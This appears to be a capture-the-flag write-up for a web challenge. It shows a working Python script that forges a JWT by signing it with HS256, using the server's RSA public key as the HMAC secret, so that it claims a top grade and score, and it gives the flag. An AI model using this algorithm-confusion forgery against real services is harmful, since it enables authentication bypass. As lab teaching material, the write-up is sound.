# Trudniejszy Bambus
**Category**: web \
**Points**: 200

## Desciption
Jestem już totalnym szefem JWT

## Solution
![](TrudniejszyBambus.png)
This time our attention is cought by them providing us their public key:
```
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA1t2d2ASw34yqUkBkU5CO
2BGJcJKc2/hp6xJs6jaWphlR/Ru7p/haAPwEkJ9tNbJ7fAfkt6OSOBDL7lHbwfSL
U68bASnnBVatnvU3Dgs8+bvN2Ojw7ykQvIFEgOfmQQKt1TD967Wmq1OWEEfolHBM
GquY+RV4Wbv5c+qiJhpzHltPSC6OsUNVacUO9S8bpm/OG0YsDA3rQhozbGBVlPnV
/4ZClSIck1kov+/M3o8AKyfmV28udf5jid8hszjCgOBHzqX/RSfkEK772/TtI7jw
YpBBiAgQ5OSm8qvHh0Ixv9XXjxvcaHMsxAbdWxevgnWcDmOUc8ShgZyMpQ5Zz2SK
BQIDAQAB
-----END PUBLIC KEY-----

```
To solve this challenge we use this python script that is simple, great commented so there will be absolutely no problems with understanding it \n
```
{
import hmac
import hashlib
import base64

file=open('id_rsa.pub')
key = file.read()

header = '{"alg": "HS256",\n"typ": "JWT"\n}'
payload = '{"grade": "6",\n"score": 100,\n"iat": 1637095545\n}'

encodedHBytes = base64.urlsafe_b64encode(header.encode("utf-8"))
encodedHeader = str(encodedHBytes, "utf-8").rstrip("=")

encodedPBytes = base64.urlsafe_b64encode(payload.encode("utf-8"))
encodedPayload = str(encodedPBytes, "utf-8").rstrip("=")

token = (encodedHeader + "." + encodedPayload)

sig = base64.urlsafe_b64encode(hmac.new(bytes(key, "UTF-8"),token.encode('utf-8'),hashlib.sha256).digest()).decode('UTF-8').rstrip("=")

print(token + "." + sig)
}
```
Script prints out token that gets us a flag!
## FLAG
flag{asymetryczna_kryptografia_to_ta_lepsza?}